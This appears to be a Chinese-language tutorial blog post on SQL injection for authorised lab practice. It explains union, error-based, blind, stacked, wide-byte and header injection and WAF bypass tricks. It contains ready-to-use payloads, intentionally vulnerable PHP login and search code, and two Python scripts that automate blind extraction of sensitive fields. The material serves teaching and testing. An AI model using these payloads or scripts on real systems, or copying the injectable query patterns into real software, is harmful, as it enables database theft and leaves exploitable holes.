---
title: 'SQL 注入基础'
date: 2026-08-18
description: 'SQL 注入的原理、分类与常用函数，涵盖联合查询注入、报错注入、布尔盲注、时间盲注、堆叠注入、宽字节注入与 HTTP 头部注入，以及常见 WAF 绕过技巧。'
draft: false
tags: [SQL注入, Web安全, MySQL, 渗透测试, 漏洞原理]
categories: [技术]
source: '🔒-安全/网络安全/未分类/补充知识(1).md'
---

> **安全声明**：本文所有内容仅用于授权测试环境（如 sqli-labs、DVWA 等本地靶场）与安全学习研究，严禁用于任何未授权的目标。未经授权对他人系统进行注入测试属于违法行为。

SQL 注入（SQL Injection）是 Web 安全领域最基础也最经典的漏洞之一。本文按"原理 → 分类 → 常用函数 → 各类注入方式 → WAF 绕过"的顺序整理，覆盖 SQL 注入从入门到实战的常用知识。

## SQL 注入原理

Web 应用向后台数据库传递 SQL 语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，攻击者就可以构造特殊的 SQL 语句，让数据库引擎直接执行，从而获取或修改数据库中的数据。

其本质是服务器没有对用户的输入做校验，导致用户可控的输入被嵌入到 SQL 语句中并由服务端执行，造成应用程序的信息泄露，甚至允许攻击者写入 WebShell。

## SQL 注入分类

按注入方式与利用手段，SQL 注入通常分为以下几类：

- 联合查询注入
- 报错注入
- 布尔盲注
- 时间盲注
- 堆叠注入
- 宽字节注入
- HTTP 头部注入

## 常用注入函数

以下函数在构造 SQL 注入 payload 时最为常用：

- `user()`：当前数据库用户
- `database()`：当前数据库名
- `version()`：当前使用的数据库版本
- `@@datadir`：数据库存储数据路径
- `concat()`：拼接数据，用于把两条数据结果拼在一起，如 `concat(username,0x3a,password)`
- `group_concat()`：和 `concat()` 类似，如 `group_concat(DISTINCT user,0x3a,password)`，用于把多条数据一次性注入出来
- `concat_ws()`：用法类似
- `hex()` 与 `unhex()`：用于 hex 编码与解码
- `load_file()`：以文本方式读取文件，在 Windows 中路径分隔符要写成 `\\`
- `select ... into outfile '路径'`：权限较高时可直接写文件

## SQL 注释

### 行间注释

- `--`

  ```sql
  DROP sampletable;--
  ```

- `#`

  ```sql
  DROP sampletable;#
  ```

### 行内注释

- `/*注释内容*/`

  ```sql
  DROP/*comment*/sampletable
  DR/**/OP/*绕过过滤*/sampletable
  SELECT/*替换空格*/password/**/FROM/**/Members
  ```

- `/*! MYSQL 专属 */`：MySQL 会执行其中内容，其他数据库则忽略

  ```sql
  SELECT /*!32302 1/0, */ 1 FROM tablename
  ```

## 联合查询注入

联合查询（Union Query）用于将多个 `SELECT` 语句的结果合并为一个结果集，使用 `UNION` 或 `UNION ALL` 关键字实现。相当于把一个查询的结果"纵向追加"到另一个查询后面：字段数不变，多查询的记录数合并。

### UNION 与 UNION ALL 的区别

- `UNION`：合并结果集并去除重复的记录。
- `UNION ALL`：合并结果集但不去除重复的记录。

### 语法

```sql
SELECT column1, column2, ...
FROM table1
WHERE condition
UNION [ALL]
SELECT column1, column2, ...
FROM table2
WHERE condition;
```

### 使用条件（回显位）

联合查询注入是 MySQL 注入中的一种方式。SQL 注入漏洞本身有存在的条件，而联合查询注入还要求**查询的信息在前端有回显**，回显数据的位置就叫"回显位"。如果存在注入漏洞的页面恰好有回显位，就可以用联合查询注入。

### 常用 payload

```sql
-- 列出当前数据库中的表（MySQL 4 版本时用 version=9，MySQL 5 版本时用 version=10）
UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;

-- 列出所有用户自定义数据库中的表
UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database();

SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='mysql';
```

```sql
-- 联合查询列名
UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
```

```sql
-- 根据列名查询所在的表
union select group_concat(xxx) from tablename
```

### 实例场景

后端代码如下：

```php
<?php
// search.php
$keyword = $_GET['q'] ?? '';

$host = 'localhost';
$db   = 'shop_db';
$user = 'user';
$pass = 'pass123';

$mysqli = new mysqli($host, $user, $pass, $db);
if ($mysqli->connect_error) {
    die("DB Error: " . $mysqli->connect_error);
}

$sql = "SELECT id, name, price FROM products WHERE name LIKE '%$keyword%'";

$result = $mysqli->query($sql);

echo "<h2>Search Results for '$keyword':</h2><ul>";
if ($result && $result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
        echo "<li>{$row['name']} - ¥{$row['price']}</li>";
    }
} else {
    echo "<li>No results.</li>";
}
echo "</ul>";
?>
```

**漏洞点**：`$keyword` 未做任何处理，直接拼入 `LIKE '%$keyword%'`，攻击者可通过闭合 `'` + `UNION SELECT` 注入。

#### Step 1：探测注入点与字段数

访问：

```
http://localhost/search.php?q=test'
```

若报错（如 `You have an error in your SQL syntax...`），说明存在注入。

尝试用 `ORDER BY` 探测字段数：

```
http://localhost/search.php?q=test' ORDER BY 1--+
http://localhost/search.php?q=test' ORDER BY 2--+
http://localhost/search.php?q=test' ORDER BY 3--+
http://localhost/search.php?q=test' ORDER BY 4--+
```

当 `ORDER BY 4` 报错（如 `Unknown column '4' in 'order clause'`），说明原查询返回 **3 个字段**。

#### Step 2：构造 UNION 查询（字段数、类型需匹配）

原查询字段：`id (INT), name (TEXT), price (DECIMAL)`，因此构造的 `UNION SELECT` 需要返回 **3 列**，且**类型兼容**（如用字符串代替数字）。

Payload 1：探测数据库名与用户

```
http://localhost/search.php?q=' UNION SELECT 1, database(), user() --+
```

返回结果中第二项显示 `shop_db`，第三项显示 `user@localhost`。

Payload 2：读取当前数据库所有表名

```
http://localhost/search.php?q=' UNION SELECT 1, table_name, 2 FROM information_schema.tables WHERE table_schema=database() --+
```

返回 `products`（可能还有其他表，如 `users`）。

Payload 3：读取 products 表所有列名

```
http://localhost/search.php?q=' UNION SELECT 1, column_name, 2 FROM information_schema.columns WHERE table_name='products' --+
```

返回 `id`、`name`、`price`、`secret_key`，发现敏感字段。

#### Step 3：窃取敏感数据

Payload 4：直接读取 secret_key

```
http://localhost/search.php?q=' UNION SELECT id, name, secret_key FROM products --+
```

页面显示：

```
• Laptop - ADMIN_SK_2025_XYZ
• Phone - USER_READ_ONLY
• Router - NETWORK_KEY_001
```

攻击者已成功获取管理员密钥。

> 注意：`UNION SELECT` 要求字段数、类型匹配。若 `secret_key` 是字符串，而原 `price` 是数字，MySQL 会自动转换（`'ABC'` → `0`），但展示时仍可能被 HTML 渲染为文本。

## 报错注入

### 原理

利用某些函数**报错时会返回参数值**这一特点，通过触发数据库错误来获取数据库的详细信息。攻击者向服务器传递恶意代码，让报错信息"携带"出自己想要的内容。

### 可利用函数（MySQL）

- `updatexml()` 函数
- `extractvalue()` 函数
- `floor()` 函数
- `name_const()` 函数
- `join()` 函数
- `exp()` 函数

#### updatexml()

**原理**：`updatexml()` 用于更新 XML 数据，接受三个参数：一个 XML 字符串、一个 XPath 表达式和一个新值。如果 XPath 表达式无效或 XML 格式错误，`updatexml()` 会返回错误信息。

**应用**：用 `CONCAT()` 将数据库版本信息拼接到无效的 XPath 表达式中，触发错误并在错误信息中返回数据库版本。

```sql
updatexml(1, CONCAT('~', (SELECT version()), '~'), 1);
```

- 第一个 `1` 是 XML 文档的占位符，重点在于触发错误，具体值不重要；
- `CONCAT('~', (SELECT version()), '~')` 拼接字符串，波浪号 `~` 用于标记起止，中间是版本信息；
- 第三个 `1` 是用于更新的值，同样不关心具体内容。

**结果**：假设 `(SELECT version())` 返回 `5.7.31-log`。

1. 拼接字符串：`CONCAT('~', ..., '~')` 得到 `~5.7.31-log~`；
2. 触发错误：`updatexml(1, '~5.7.31-log~', 1)` 尝试执行无效的 XML 更新操作（第一个参数不是有效 XML 文档），数据库抛出包含 `~5.7.31-log~` 的错误；
3. 错误信息泄露：攻击者在错误信息中看到数据库版本号。

#### extractvalue()

**原理**：`extractvalue()` 用于从 XML 数据中提取值，接受两个参数：一个 XML 字符串和一个 XPath 表达式。如果 XPath 表达式无效或 XML 格式错误，会返回错误信息。

**应用**：用 `CONCAT()` 将数据库名拼接到无效的 XPath 表达式中，触发错误并返回数据库名。

```sql
SELECT extractvalue(1, CONCAT('~', (SELECT database()), '~'));
```

**结果**：假设当前数据库名为 `mydatabase`，拼接后得到 `~mydatabase~`，无效 XPath 触发错误，错误信息中携带数据库名。

#### floor()

**原理**：`floor()` 返回小于或等于指定数值的最大整数。如果输入值包含随机数生成函数（如 `rand()`），在某些情况下会生成重复的值，从而触发**重复键错误**，并在错误信息中包含数据库名。

**应用**：

```sql
SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x;
```

- `COUNT(*)`：统计 `information_schema.tables` 表中的记录数；
- `CONCAT(...)`：将数据库名、冒号和随机数拼成一个字符串。`0x3a` 是十六进制的冒号 `:`，用于分隔；`FLOOR(RAND(0)*2)` 随机生成 0 或 1；
- 最终生成的字符串格式为 `数据库名:0` 或 `数据库名:1`；
- `x`：为拼接后的字符串指定别名；
- `GROUP BY x`：按照拼接后的字符串分组，当 `FLOOR(RAND(0)*2)` 生成的随机数导致某些组出现重复键时，触发重复键错误，错误信息中携带数据库名。

#### name_const()

**原理**：`name_const()` 用于为一个常量值指定名称，如果在 SQL 查询中重复使用相同的名称，会触发错误。

**应用**：

```sql
SELECT * FROM users WHERE id = 1 AND (SELECT name_const(version(),1) LIMIT 1,1);
```

- `SELECT * FROM users WHERE id = 1`：从 `users` 表检索 `id` 等于 1 的所有列；
- `AND (SELECT name_const(version(),1) LIMIT 1,1)`：`name_const(version(),1)` 创建名为数据库版本号、值为 1 的常量；`LIMIT 1,1` 用于跳过第一条并取第二条，因结果只有一条记录而触发"索引越界"错误，错误信息中包含版本号。

#### join()

**原理**：SQL 中的 `JOIN` 操作在多个表之间建立关联，如果在 `JOIN` 中构造错误语句，也可能触发错误信息。

**应用**：

```sql
SELECT * FROM users u JOIN (SELECT 1 AS a, (SELECT database()) AS b) t ON u.id = t.a;
```

- `SELECT * FROM users u`：检索 `users` 表所有列，别名 `u`；
- `JOIN (SELECT 1 AS a, (SELECT database()) AS b) t`：连接 `users` 表与一个子查询，子查询返回两列：`a` 恒为 1，`b` 为当前数据库名，子查询结果作为临时表 `t`；
- `ON u.id = t.a`：`t.a` 恒为 1，只会匹配 `users` 表中 `id = 1` 的记录。

#### exp()

**原理**：`exp()` 用于计算 e 的指定次方，如果输入值导致数学错误（如无穷大或 NaN），会触发错误。

**应用**：

```sql
SELECT EXP(~(SELECT * FROM (SELECT user())a));
```

- `SELECT user()`：返回当前数据库用户名；
- `(SELECT * FROM (SELECT user())a)`：把 `user()` 包装成子查询 `a`，用于绕过一些简单的防注入措施；
- 位运算符 `~`：对字符串结果执行按位取反操作，因为按位取反只能应用于整数，所以会触发 MySQL 错误；
- `EXP(...)`：进一步确保触发错误。

### 常用 payload

```sql
# 获取库名
1' and extractvalue(0x0a,concat(0x0a,(select database())))--+

# 获取表名
1' and extractvalue(0x0a,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema='tale')))--+

# 获取列名
1' and extractvalue(0x0a,concat(0x0a,(select left(group_concat(concat_ws('~',column_name)),32) from information_schema.columns where table_schema='tale' and table_name='t_f111ag')))--+

# 前半段 flag
1' and extractvalue(0x0a,concat(0x0a,(select left(group_concat(concat_ws('~',flag)),32) from tale.t_f111ag)))--+

# 后半段 flag
1' and extractvalue(0x0a,concat(0x0a,(select right(group_concat(concat_ws('~',flag)),32) from tale.t_f111ag)))--+
```

> 报错信息通常有长度限制，数据过长会被截断，可用 `left()` / `right()` / `substr()` 分段提取。上面的例子即用 `left(...,32)` / `right(...,32)` 分段读取 flag。

### 实操场景

```php
<?php
// login.php
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

$pdo = new PDO(
    'mysql:host=localhost;dbname=bank_db',
    'root', 'root123',
    [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
);

$stmt = $pdo->prepare("SELECT 1 FROM users WHERE username = '$username' AND password_hash = SHA2('$password', 256)");
$stmt->execute();

if ($stmt->fetchColumn()) {
    header("Location: /welcome.php");
    exit;
} else {
    echo "<h3>用户名或密码错误</h3>";
}
?>
```

**漏洞关键点**：

- 使用 `PDO::ERRMODE_EXCEPTION` → SQL 错误会抛出 PHP Exception，包含完整 SQL 语句与错误详情；
- 页面虽无 UNION 回显，但**错误信息包含攻击者可控内容** → 可构造报错函数"携带"数据。

#### Step 1：确认报错是否回显

提交：

```http
POST /login.php

username=admin'&password=123
```

页面显示：

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation:
1064 You have an error in your SQL syntax near ''admin'' AND password_hash = SHA2('123', 256)'
```

确认存在报错注入。

#### Step 2：利用 extractvalue() 报错带出数据

Payload 1：获取数据库名

```http
username=admin' AND extractvalue(1, concat(0x7e, database(), 0x7e))--+&password=any
```

`0x7e` = `~`（避免 XML 特殊字符干扰），报错信息含：

```
... XPATH syntax error: '~bank_db~'
```

成功获取库名 `bank_db`。

Payload 2：获取当前用户

```http
username=admin' AND extractvalue(1, concat(0x7e, user(), 0x7e))--+&password=any
```

报错：`... '~root@localhost~'`

Payload 3：读取表名（information_schema）

```http
username=admin' AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='bank_db' LIMIT 0,1), 0x7e))--+&password=any
```

报错：`... '~users~'`（改 `LIMIT 1,1` 可读取下一张表）。

Payload 4：读取列名

```http
username=admin' AND extractvalue(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 2,1), 0x7e))--+&password=any
```

报错：`... '~password_hash~'`（`LIMIT 2,1` 因前两列为 `id`、`username`）。

Payload 5：窃取 admin 密码哈希

```http
username=admin' AND extractvalue(1, concat(0x7e, (SELECT password_hash FROM users WHERE role='admin'), 0x7e))--+&password=any
```

报错：

```
... XPATH syntax error: '~SECRET_ADMIN_HASH_2025~'
```

若数据过长（>32 字符）报错会截断，可用 `substr()` 分段：

```sql
substr((SELECT password_hash FROM users WHERE id=3), 1, 30)
```

## 布尔盲注

### 原理

当我们改变传给后台的 SQL 参数时，页面既不显示相应内容也不报错，只呈现**正常**或**不正常**两种状态，就可以根据这两种状态判断输入的语句是否查询成功。

布尔盲注一般适用于页面没有回显字段（不支持联合查询），且 Web 页面只返回 True / False 的场景：构造 SQL 语句，利用 `and`、`or` 等关键字让后续语句为 `true` 或 `false`，使页面返回不同状态，从而逐字符猜解数据。

### 自动化脚本

下面是一个基于二分法 + 布尔判断的提取脚本：

```python
import time
import requests

url = 'http://localhost/profile.php'  # 改成你的目标 URL
flag = ''

# 可选：根据阶段切换 payload（取消注释即可）
# payload_template = "1 AND ASCII(SUBSTR((SELECT database()),%d,1))>%d"
# payload_template = "1 AND ASCII(SUBSTR((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),%d,1))>%d"
# payload_template = "1 AND ASCII(SUBSTR((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='employees'),%d,1))>%d"
payload_template = "1 AND ASCII(SUBSTR((SELECT ssn FROM employees WHERE id=3),%d,1))>%d"  # 当前提取目标字段

for i in range(1, 100):
    low = 32      # 可打印字符起点（空格）
    high = 127    # DEL 之前
    mid = (low + high) // 2

    while low < high:
        # 构造完整 payload（替换模板中的 %d）
        payload = payload_template % (i, mid)
        # 拼接到参数中（根据你的接口调整）
        params = {'id': payload}

        r = requests.get(url, params=params)
        time.sleep(0.05)  # 防请求过快被限

        # 判断"真"条件 → 页面含特征字符串
        if "class='profile'" in r.text:  # 改成你页面"存在"时的特征
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

        # 提前终止（如遇到空字符）
        if mid == 32 or mid == 127:
            break

    # 累加结果
    flag += chr(mid)
    print(flag)

    # 若连续两字符为不可见字符，结束
    if len(flag) >= 2 and ord(flag[-1]) < 33 and ord(flag[-2]) < 33:
        flag = flag.rstrip('\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f ')
        break

print("\n Result:", flag)
```

## 时间盲注

### 简介

时间盲注又称延迟注入。当页面不返回错误信息、只回显同一种界面时，可以根据页面返回的时间来判断注入条件是否成立。其主要特征是**利用 `sleep()` 等函数制造时间延迟**，由回显时间长短来判断条件真假。

### 延迟手段

- `sleep()`
- `benchmark()`
- 笛卡尔积
- `GET_LOCK()`
- RLIKE 正则

#### sleep()

`sleep()` 在执行期间暂停指定的秒数。

```sql
SELECT IF(condition, SLEEP(seconds), 0);
```

示例：

```sql
SELECT IF(1=1, SLEEP(5), 0); -- 如果条件为真，延迟 5 秒
```

如果条件为真，`sleep()` 使数据库暂停执行，页面延迟返回。

#### benchmark()

`benchmark()` 重复执行指定表达式多次，用于制造计算延迟。

```sql
SELECT IF(condition, BENCHMARK(count, expression), 0);
```

示例：

```sql
SELECT IF(1=1, BENCHMARK(1000000, SHA1('test')), 0); -- 条件为真时进行 100 万次 SHA1 计算
```

通过执行大量计算任务制造延迟。

#### 笛卡尔积

通过生成大规模结果集制造延迟。

```sql
SELECT * FROM table1, table2 WHERE condition;
```

示例：

```sql
SELECT * FROM large_table1, large_table2 WHERE 1=1; -- 生成大结果集
```

通过大规模连接查询，制造处理结果集的延迟。

#### GET_LOCK()

`GET_LOCK()` 尝试获取指定名称的锁，如果锁可用则返回成功并持有锁指定的时间。

```sql
SELECT IF(condition, GET_LOCK('lock_name', timeout), 0);
```

示例：

```sql
SELECT IF(1=1, GET_LOCK('test_lock', 10), 0); -- 条件为真时获取 10 秒的锁
```

通过获取锁制造延迟，观察页面响应时间判断条件真假。

#### RLIKE 正则

通过复杂的正则表达式匹配制造计算延迟。

```sql
SELECT IF(condition, 1 RLIKE pattern, 0);
```

示例：

```sql
SELECT IF(1=1, 1 RLIKE (SELECT CASE WHEN (1=1) THEN 'a' ELSE 0x28 END), 0); -- 条件为真时进行正则匹配
```

### 利用过程

**第一步：判断注入点**

```
"and 1=1--+  页面返回有数据
"and 1=0--+  页面返回有数据
```

页面返回没有变化，可能是盲注。

**第二步：判断可使用注入方法**

用 `sleep()` 判断能否利用时间盲注，若 `sleep()` 被过滤就换其他函数。

```
"and sleep(5)--+
```

页面延时，则是时间盲注。

**第三步：猜数据库名称长度**

```
"and if((length(database()))=10,sleep(5),1)--+  页面延时了
```

当前数据库名长度为 10。

**第四步：猜数据库名称（ASCII 码）**

```
"and if(ascii(substr(database(),1,1))=107,sleep(5),1)--+  页面延时了
```

数据库第一个字母是 `k`（ASCII 107），依次类推得到完整数据库名。

### 自动化脚本

```python
import time
import requests

url = 'http://localhost/api.php'  # 改成你的目标 URL
flag = ''

# 注入点参数（根据你的接口调整）
# payload_template = "1 AND IF(ASCII(SUBSTR((SELECT database()),%d,1))>%d, SLEEP(2), 1)"
# payload_template = "1 AND IF(ASCII(SUBSTR((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),%d,1))>%d, SLEEP(2), 1)"
payload_template = "1 AND IF(ASCII(SUBSTR((SELECT ssn FROM employees WHERE id=3),%d,1))>%d, SLEEP(2), 1)"  # 当前提取目标字段

for i in range(1, 100):
    low = 32
    high = 127
    mid = (low + high) // 2

    while low < high:
        # 构造 payload
        payload = payload_template % (i, mid)
        params = {'id': payload}

        start = time.time()
        try:
            r = requests.get(url, params=params, timeout=5)  # timeout > SLEEP 时间
        except:
            # 超时视为条件成立（SLEEP 触发）
            low = mid + 1
        else:
            elapsed = time.time() - start
            # 若耗时 > 1.5 秒 → 视为 SLEEP 执行 → 条件为真
            if elapsed > 1.5:  # 根据你的 SLEEP(2) 调整阈值（建议 = SLEEP 时间 × 0.75）
                low = mid + 1
            else:
                high = mid
        mid = (low + high) // 2

        if mid == 32 or mid == 127:
            break

    flag += chr(mid)
    print(flag)

    # 提前终止（连续不可见字符）
    if len(flag) >= 2 and ord(flag[-1]) < 33 and ord(flag[-2]) < 33:
        flag = flag.rstrip('\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f ')
        break

print("\n Result:", flag)
```

## 堆叠注入

### 原理

堆叠注入，顾名思义，就是把多条 SQL 语句堆叠在一起执行。

```sql
select * from users;show databases;
```

`mysqli_query()` 是 PHP 中执行单条 MySQL 查询的函数；`mysqli_multi_query()` 则支持多条 SQL 语句同时执行，以分号 `;` 分隔。

但实际情况中，PHP 为防止 SQL 注入，往往调用 `mysqli_query()` 执行查询，它只能执行一条语句，分号后面的内容不会被执行，所以堆叠注入的使用条件十分有限。不过一旦条件满足，危害往往极大。

## 宽字节注入

### addslashes() 转义函数

`addslashes()` 是 PHP 中用于转义字符串特殊字符的函数之一，会在预定义字符（单引号、双引号、反斜线、NUL 字符）前添加反斜杠，防止这些字符被误解为代码注入或其他意外操作。

```php
<?php
$input = "O'Reilly";
$safe_input = addslashes($input);
echo $safe_input; // 输出 O\'Reilly

$input = 'He said "Hello"';
$safe_input = addslashes($input);
echo $safe_input; // 输出 He said \"Hello\"

$input = "Backslash: \\";
$safe_input = addslashes($input);
echo $safe_input; // 输出 Backslash: \\
?>
```

### 宽字节注入原理

在网站开发中，防范 SQL 注入是至关重要的安全措施之一，常见防御手段就是使用 `addslashes()` 转义特殊字符。然而宽字节注入利用了这种转义机制的漏洞，通过特殊构造的宽字节字符绕过 `addslashes()` 的转义。

攻击者利用宽字节字符集（**GBK**）**将两个字节识别为一个汉字**，绕过反斜线转义机制，使单引号逃逸，实现对数据库查询语句的篡改。

### 绕过示例

设有以下测试 payload：

```
输入 payload: ' or 1=1 #
经过 addslashes() 后：\' or 1=1 #
```

分析：`'` 的 URL 编码是 `%27`，经过 `addslashes()` 后变成 `\'`，反斜杠 `\` 的 URL 编码是 `%5C`，`\'` 对应的 URL 编码就是 `%5c%27`。

针对上述情况，构造绕过 payload：

```
构造绕过 payload：%df' or 1=1 #
经过 addslashes() 后：%df\' or 1=1 #
在数据库中执行：雅'or 1=1 #
```

分析：在 payload 的 `'` 之前加一个字符 `%df`，经过 `addslashes()` 后 `%df'` 变成 `%df\'`，对应 URL 编码为 `%df%5c%27`。**当 MySQL 使用 GBK 编码时，会把 `%df%5c` 解析成一个字**，从而让单引号 `%27` 成功逃逸。`%DF%5C` 在 GBK 编码中对应的正是汉字"雅"。

## HTTP 头部注入

### 原理

后台开发人员为了验证客户端 HTTP Header（如常见的 Cookie 验证），或者通过 HTTP Header 获取客户端信息（如 User-Agent、Accept 等字段），会对客户端 HTTP Header 进行获取并使用 SQL 语句处理。如果此时没有足够的安全考虑，就可能导致基于 HTTP Header 的注入漏洞。

### 常见 HTTP 头部注入类型

1. Cookie 注入
2. User-Agent 注入
3. Referer 注入
4. XFF 注入

## WAF 绕过

### 大小写绕过

常用于 WAF 的正则对大小写不敏感的场景，一般是靶场故意这样设计。例如 WAF 过滤了关键字 `select`，可尝试用 `Select` 等绕过。

### 内联注释绕过

内联注释就是把一些 MySQL 特有的语句放在 `/*!...*/` 中。这些语句在其他数据库不会执行，但在 MySQL 中会执行。

### 双写关键字绕过

在某些简单的 WAF 中，关键字（如 `select`）被 `replace()` 函数直接替换为空，此时可双写绕过：`select` 写成 `seleselectct`，经过 WAF 处理后又变回 `select`。

### 特殊编码绕过

- 十六进制绕过

  ```sql
  select * from users where username = 0x7465737431;
  ```

- ASCII 编码绕过：`test` 等价于

  ```sql
  CHAR(101,97,115,116)
  ```

### 空格过滤绕过

用以下方式替代空格：

```sql
/**/
()
换行（URL 编码中的 %0a）
` 反引号
tab（%09）
```

### 逻辑关键字（and / or / xor / not）绕过

```sql
and = &&
or  = ||
xor = |   # 异或
not = !
```

### 等号（=）绕过

- 不加通配符的 `like` 效果与 `=` 一致，可用来绕过：

  ```sql
  -- 正常带通配符的 like
  select * from users where username like "test%";
  -- 不带通配符的 like 取代 =
  select * from users where id like 1;
  ```

- `rlike`：模糊匹配，只要字段值中存在要查找的部分就会被选出来；不加通配符时效果与 `=` 一致。
- `regexp`：MySQL 中使用 `REGEXP` 操作符进行正则表达式匹配。
- 使用大小于号绕过。
- `<>` 等价于 `!=`，在前面再加一个 `!`，`!<>` 结果就等于 `=`。

### 大小于号绕过

在 SQL 盲注中，一般用大小于号判断 ASCII 码大小来实现爆破。如果过滤了大小于号，可用以下关键字代替：

- `greatest(n1, n2, n3...)`：返回 n 中的最大值
- `least(n1, n2, n3...)`：返回 n 中的最小值
- `strcmp(str1, str2)`：若所有字符串均相同返回 0；若第一个参数小于第二个返回 -1，否则返回 1
- `in` 关键字
- `between a and b`：范围在 a-b 之间

### 逗号绕过

如果 WAF 过滤了逗号，而盲注又基本离不开逗号，取子串的几个函数中有一个替代方式：`from pos for len`，pos 表示从第 pos 位开始读取 len 长度的子串。

- 用 `from pos for len` 取代逗号：

  ```sql
  select substr("string",1,3);          -- 等价于
  select substr("string" from 1 for 3);
  ```

- 用 `join` 关键字绕过：

  ```sql
  select * from users union select * from (select 1)a join (select 2)b join(select 3)c;
  ```

- 用 `like` 关键字：适用于 `substr()` 等提取子串函数中的逗号。
- 用 `offset` 关键字：适用于 `limit` 中的逗号被过滤的场景，`limit 2,1` 等价于 `limit 1 offset 2`。

### 引号限制绕过

```sql
-- hex 编码
SELECT * FROM Users WHERE username = 0x61646D696E;
-- char() 函数
SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110);
```

### 字符串黑名单绕过

```sql
SELECT 'a' 'd' 'mi' 'n';
SELECT CONCAT('a', 'd', 'm', 'i', 'n');
SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');
SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');
```

使用 `CONCAT()` 时，任一参数为 NULL 将返回 NULL，推荐使用 `CONCAT_WS()`。`CONCAT_WS()` 第一个参数表示用哪个字符间隔查询结果。

### 函数过滤绕过

- `sleep()` → `benchmark()`
- `ascii()` → `hex()`、`bin()`：替代后再把对应进制转回字符串即可
- `group_concat()` → `concat_ws()`
- `substr()`、`substring()`、`mid()` 可以相互取代，取子串的函数还有 `left()`、`right()`
- `substr(str,start,1)` 等价于 `right(left(str,len),1)`，也可以用 `left()`、`right()`、`reverse()` 组合绕过；用正则 `regexp` 匹配字符串也有奇效，如 `regexp '^flag'` 可匹配以 flag 开头的字符串
- `ord()` → `ascii()`：这两个函数处理英文时效果一样，但处理中文等字符时结果不一致

---

> 💡 **入门**：如果是初学者，可以先看 [SQL 注入入门](/posts/sql-injection-guide/)（注入点判断 + 联合/布尔盲注/报错注入实战）。
